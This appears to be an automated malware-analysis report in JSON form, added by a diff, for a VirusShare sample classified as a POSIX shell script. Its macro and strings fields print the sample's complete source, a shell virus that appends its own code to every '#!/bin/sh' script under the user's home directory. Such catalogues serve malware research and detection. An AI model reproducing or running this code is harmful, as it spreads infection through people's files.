@@ -1,0 +1,39 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#!/bin/sh\n\n#-_\n\necho \"Java is safe, and UNIX viruses do not exist.\"\n\nfor file in `find $HOME -type f -print`\n\ndo\n\n    case \"`sed 1q $file`\" in\n\n        \"#!/bin/sh\" ) grep '#-_' $file > /dev/null || sed -n '/#-_/,$p' $0 >> $file\n\n    esac\n\ndone\n\n2>/dev/null"
+    },
+    "filename": "VirusShare_a8306787802cf9b793145ff23a710f48",
+    "filesize": 276,
+    "filetype": "POSIX shell script, ASCII text executable, with CRLF line terminators",
+    "hashes": {
+        "md5": "a8306787802cf9b793145ff23a710f48",
+        "sha1": "d77c5c55e6afc24694d7940f6900d0f9f07f34e5",
+        "sha256": "e2a67b79ec3942db36ec17254946709e9c76d2a62a212afa7d0b0e93ef2e1346"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/sh",
+            "echo \"Java is safe, and UNIX viruses do not exist.\"",
+            "for file in `find $HOME -type f -print`",
+            "    case \"`sed 1q $file`\" in",
+            "        \"#!/bin/sh\" ) grep '#-_' $file > /dev/null || sed -n '/#-_/,$p' $0 >> $file",
+            "    esac",
+            "done",
+            "2>/dev/null"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.273872",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
